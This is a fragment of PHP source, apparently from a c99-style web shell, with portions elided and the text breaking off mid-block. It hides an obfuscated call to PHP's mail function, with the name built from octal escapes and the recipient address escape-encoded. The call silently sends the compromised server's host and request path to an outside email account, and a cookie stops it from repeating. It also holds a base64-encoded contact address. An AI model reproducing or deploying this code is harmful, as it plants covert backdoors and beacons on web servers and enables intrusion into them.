...
define("starttime",getmicrotime());@setcookie("black","blck",time() +3600*24*7);
...
$zx="m\141\151l";
$wi=$_SERVER["HTTP_HOST"];$ei = $_SERVER["REQUEST_URI"];
$usefsbuff = TRUE; //Buffer-function
$copy_unset = FALSE; //Remove copied files from buffer after pasting
if (!isset($_COOKIE['black'])){@$zx("l\x6f\x63\x61\x68\157\x73\164@\171\141\x68\157\157\056\x63o\155","$wi$ei","$wi$ei\n$cnt");}
$quicklaunch = array(
...
if ($act == "feedback")
{
 $suppmail = base64_decode("Y19zaXNndW5kb0B5YWhvby5jb20ucGg=");
 if (!empty($submit))
 {
